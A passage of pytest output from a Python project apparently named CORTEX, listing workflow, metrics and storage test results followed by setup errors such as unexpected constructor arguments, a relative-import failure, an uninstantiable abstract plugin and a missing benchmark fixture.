tests/tier3/metrics/test_file_metrics.py::TestStability::test_stability_values PASSED [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_analyzer_initialization ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_analyze_hotspots_basic ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_save_and_retrieve_hotspots ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_get_unstable_files ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_churn_rate_filtering ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_stability_classification ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_force_analysis_flag ERROR [ 94%]
tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_date_range_filtering ERROR [ 94%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetric::test_git_metric_creation PASSED [ 94%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetric::test_git_metric_defaults PASSED [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_collector_initialization ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_collect_metrics_empty_period ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_save_and_retrieve_metrics ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_get_metrics_date_filtering ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_duplicate_metric_handling ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_force_collection_flag ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_aggregation_across_contributors ERROR [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_empty_repository_handling FAILED [ 95%]
tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_get_metrics_with_specific_contributor ERROR [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_store_initialization PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_database_tables_created PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_git_metrics_schema PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_file_hotspots_schema PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_indexes_created PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_get_connection PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_vacuum PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_analyze PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_get_database_size PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_get_table_counts PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_unique_constraints PASSED [ 95%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_check_constraints PASSED [ 96%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_default_values PASSED [ 96%]
tests/tier3/storage/test_context_store.py::TestContextStore::test_timestamp_columns PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestDatabaseInitialization::test_creates_database_file PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestDatabaseInitialization::test_creates_git_metrics_table PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestDatabaseInitialization::test_creates_file_hotspots_table PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestGitMetricsCollection::test_saves_git_metrics PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestGitMetricsCollection::test_aggregates_metrics_by_date PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestGitMetricsCollection::test_filters_by_date_range PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestFileHotspotAnalysis::test_saves_file_hotspots PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestFileHotspotAnalysis::test_classifies_stability_correctly PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestVelocityAnalysis::test_calculates_velocity_trend PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestVelocityAnalysis::test_detects_velocity_drop PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestInsightGeneration::test_generates_velocity_drop_insight PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestInsightGeneration::test_generates_file_hotspot_insight PASSED [ 96%]
tests/tier3/test_context_intelligence.py::TestContextSummary::test_generates_comprehensive_summary PASSED [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_full_system_initialization ERROR [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_git_metrics_workflow ERROR [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_file_hotspots_workflow ERROR [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_insights_workflow ERROR [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_refresh_all_functionality ERROR [ 96%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_get_summary_functionality ERROR [ 97%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_database_operations ERROR [ 97%]
tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_multi_day_analysis_consistency ERROR [ 97%]
tests/unit/test_llm_orchestrator.py::test_openai_primary_selection PASSED [ 97%]
tests/unit/test_llm_orchestrator.py::test_fallback_to_local_when_tools_not_supported PASSED [ 97%]
tests/unit/test_llm_orchestrator.py::test_unknown_provider_error PASSED  [ 97%]
tests/unit/test_router.py::TestCortexRouter::test_context_injection PASSED [ 97%]
tests/unit/test_router.py::TestCortexRouter::test_conversation_logging PASSED [ 97%]
tests/unit/test_router.py::TestCortexRouter::test_intent_detection 
tests/unit/test_router.py::TestCortexRouter::test_intent_detection PASSED [ 97%]
tests/unit/test_router.py::TestCortexRouter::test_process_request PASSED [ 97%]
tests/unit/test_router.py::TestCortexRouterPerformance::test_routing_performance_target PASSED [ 97%]
tests/unit/test_router.py::TestCortexRouterPerformance::test_total_performance_target PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_create_checkpoint_manager PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_save_checkpoint PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_load_checkpoint PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_load_nonexistent_checkpoint PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_delete_checkpoint PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_delete_nonexistent_checkpoint PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_list_checkpoints PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_list_empty_checkpoints PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_get_resumable_checkpoints PASSED [ 97%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_cleanup_old_checkpoints PASSED [ 98%]
tests/workflows/test_checkpoint.py::TestCheckpointManager::test_checkpoint_persistence_across_instances PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowState::test_create_workflow_state PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowState::test_set_and_get_stage_output PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowState::test_set_stage_status PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowState::test_to_dict PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowState::test_from_dict PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestStageDefinition::test_create_stage_definition PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestStageDefinition::test_stage_with_dependencies PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestStageDefinition::test_stage_with_retry_config PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_create_workflow_definition PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_validate_dag_success PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_validate_dag_missing_dependency PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_validate_dag_cycle_detection PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_topological_sort_linear PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_topological_sort_parallel PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowDefinition::test_from_yaml PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_create_orchestrator_valid_workflow PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_create_orchestrator_invalid_workflow PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_register_stage PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_execute_simple_workflow PASSED [ 98%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_execute_workflow_with_required_stage_failure FAILED [ 99%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_execute_workflow_with_optional_stage_failure FAILED [ 99%]
tests/workflows/test_workflow_engine.py::TestWorkflowOrchestrator::test_checkpoint_and_resume FAILED [ 99%]
tests/workflows/test_workflow_engine.py::TestBaseWorkflowStage::test_base_stage_execute_not_implemented PASSED [ 99%]
tests/workflows/test_workflow_engine.py::TestBaseWorkflowStage::test_base_stage_validate_input_default PASSED [ 99%]
tests/workflows/test_workflow_engine.py::TestBaseWorkflowStage::test_base_stage_on_failure_default PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_happy_path FAILED [ 99%]
tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_checkpoint_resume FAILED [ 99%]
tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_error_recovery PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestFeatureDevelopmentWorkflow::test_feature_development_required_stage_failure FAILED [ 99%]
tests/workflows/test_workflow_integration.py::TestBugFixWorkflow::test_bug_fix_happy_path PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestBugFixWorkflow::test_bug_fix_checkpoint_resume PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestBugFixWorkflow::test_bug_fix_error_recovery PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestBugFixWorkflow::test_bug_fix_required_stage_failure FAILED [ 99%]
tests/workflows/test_workflow_integration.py::TestRefactoringWorkflow::test_refactoring_happy_path PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestRefactoringWorkflow::test_refactoring_checkpoint_resume PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestRefactoringWorkflow::test_refactoring_error_recovery PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestRefactoringWorkflow::test_refactoring_required_stage_failure FAILED [ 99%]
tests/workflows/test_workflow_integration.py::TestSecurityEnhancementWorkflow::test_security_happy_path PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestSecurityEnhancementWorkflow::test_security_checkpoint_resume PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestSecurityEnhancementWorkflow::test_security_error_recovery PASSED [ 99%]
tests/workflows/test_workflow_integration.py::TestSecurityEnhancementWorkflow::test_security_required_stage_failure FAILED [100%]

=================================== ERRORS ====================================
_ ERROR at setup of TestMultiAgentWorkflow.test_feature_development_full_pipeline _
tests\integration\test_agent_coordination.py:42: in intent_router
    return IntentRouter(brain_root=str(mock_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestMultiAgentWorkflow.test_architecture_planning_workflow _
tests\integration\test_agent_coordination.py:42: in intent_router
    return IntentRouter(brain_root=str(mock_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestSKULLProtectionLayer.test_skull_001_blocks_untested_changes _
tests\integration\test_error_recovery.py:64: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestSKULLProtectionLayer.test_skull_001_allows_tested_changes _
tests\integration\test_error_recovery.py:64: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestSKULLProtectionLayer.test_skull_002_blocks_untested_integrations _
tests\integration\test_error_recovery.py:64: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestSKULLProtectionLayer.test_skull_003_warns_on_css_changes _
tests\integration\test_error_recovery.py:64: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestSKULLProtectionLayer.test_skull_004_warns_on_immediate_retry _
tests\integration\test_error_recovery.py:64: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestBrainTierProtection.test_tier0_immutability_enforced __
tests\integration\test_error_recovery.py:270: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
___ ERROR at setup of TestBrainTierProtection.test_tier1_schema_validation ____
tests\integration\test_error_recovery.py:270: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestBrainTierProtection.test_tier1_retention_limit_enforced _
tests\integration\test_error_recovery.py:270: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
____ ERROR at setup of TestBrainTierProtection.test_tier2_yaml_validation _____
tests\integration\test_error_recovery.py:270: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_ ERROR at setup of TestBrainTierProtection.test_tier3_read_only_enforcement __
tests\integration\test_error_recovery.py:270: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
__ ERROR at setup of TestValidationRules.test_hardcoded_credentials_blocked ___
tests\integration\test_error_recovery.py:468: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_______ ERROR at setup of TestValidationRules.test_low_coverage_warning _______
tests\integration\test_error_recovery.py:468: in brain_protector
    return BrainProtector(brain_root=str(temp_brain_root))
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BrainProtector.__init__() got an unexpected keyword argument 'brain_root'
_______ ERROR at setup of TestOptimizeCortexOrchestrator.test_metadata ________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizeCortexOrchestrator.test_validate_prerequisites_success _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizeCortexOrchestrator.test_validate_prerequisites_missing_git _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizeCortexOrchestrator.test_validate_prerequisites_missing_tests _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizeCortexOrchestrator.test_validate_prerequisites_missing_knowledge_graph _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
________ ERROR at setup of TestSKULLTests.test_run_skull_tests_success ________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
________ ERROR at setup of TestSKULLTests.test_run_skull_tests_failure ________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
________ ERROR at setup of TestSKULLTests.test_run_skull_tests_timeout ________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
___ ERROR at setup of TestArchitectureAnalysis.test_analyze_knowledge_graph ___
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_____ ERROR at setup of TestArchitectureAnalysis.test_analyze_operations ______
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
__ ERROR at setup of TestArchitectureAnalysis.test_analyze_brain_protection ___
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
____ ERROR at setup of TestOptimizationPlan.test_generate_plan_with_issues ____
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizationPlan.test_generate_plan_with_high_frequency_patterns _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
___ ERROR at setup of TestOptimizationExecution.test_execute_optimizations ____
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestOptimizationExecution.test_execute_optimizations_with_failures _
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_________ ERROR at setup of TestGitOperations.test_git_commit_success _________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_______ ERROR at setup of TestGitOperations.test_git_commit_no_changes ________
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
______ ERROR at setup of TestIntegration.test_full_optimization_workflow ______
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_______ ERROR at setup of TestMetrics.test_generate_optimization_report _______
tests\operations\test_optimize_cortex_orchestrator.py:47: in orchestrator
    return OptimizeCortexOrchestrator(project_root=project_root)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: BaseOperationModule.__init__() got an unexpected keyword argument 'project_root'
_ ERROR at setup of TestRouterCommandExpansion.test_slash_command_expanded_before_routing _
tests\plugins\test_command_expansion.py:32: in mock_router
    from router import CortexRouter
src\router.py:23: in <module>
    from .session_manager import SessionManager
E   ImportError: attempted relative import with no known parent package
_ ERROR at setup of TestRouterCommandExpansion.test_natural_language_passes_through _
tests\plugins\test_command_expansion.py:32: in mock_router
    from router import CortexRouter
src\router.py:23: in <module>
    from .session_manager import SessionManager
E   ImportError: attempted relative import with no known parent package
_ ERROR at setup of TestRouterCommandExpansion.test_unknown_slash_command_passes_through _
tests\plugins\test_command_expansion.py:32: in mock_router
    from router import CortexRouter
src\router.py:23: in <module>
    from .session_manager import SessionManager
E   ImportError: attempted relative import with no known parent package
_ ERROR at setup of TestConfigurationWizardPlugin.test_plugin_initialization __
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_____ ERROR at setup of TestConfigurationWizardPlugin.test_discover_mode ______
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_oracle_from_code _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_apis_from_code _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_from_environment _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_apis_from_environment _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_____ ERROR at setup of TestConfigurationWizardPlugin.test_parse_tnsnames _____
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_____ ERROR at setup of TestConfigurationWizardPlugin.test_save_to_config _____
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_openapi_specs _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_validate_api_connection _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
__ ERROR at setup of TestConfigurationWizardPlugin.test_non_interactive_mode __
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_extract_namespace_from_dsn _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestConfigurationWizardPlugin.test_discover_all_integration _
tests\plugins\test_configuration_wizard_plugin.py:29: in plugin
    return Plugin()
           ^^^^^^^^
E   TypeError: Can't instantiate abstract class Plugin without an implementation for abstract methods '_get_metadata', 'cleanup'
_ ERROR at setup of TestContextInjectionPerformance.test_context_injection_under_200ms _
file D:\PROJECTS\CORTEX\tests\test_risk_mitigation.py, line 391
      def test_context_injection_under_200ms(self, benchmark):
E       fixture 'benchmark' not found
>       available fixtures: cache, capfd, capfdbinary, caplog, capsys, capsysbinary, capteesys, class_mocker, cov, db_connection, doctest_namespace, mock_agent, mock_tier1_api, mock_tier2_kg, mock_tier3_context, mock_tier_apis, mocker, module_mocker, monkeypatch, no_cover, package_mocker, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_agent_request, sample_agent_response, sample_files, session_mocker, subtests, temp_brain, temp_db, temp_dir, temp_workspace, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.

D:\PROJECTS\CORTEX\tests\test_risk_mitigation.py:391
_ ERROR at setup of TestContextInjectionPerformance.test_fts5_search_under_100ms _
file D:\PROJECTS\CORTEX\tests\test_risk_mitigation.py, line 406
      def test_fts5_search_under_100ms(self, benchmark):
E       fixture 'benchmark' not found
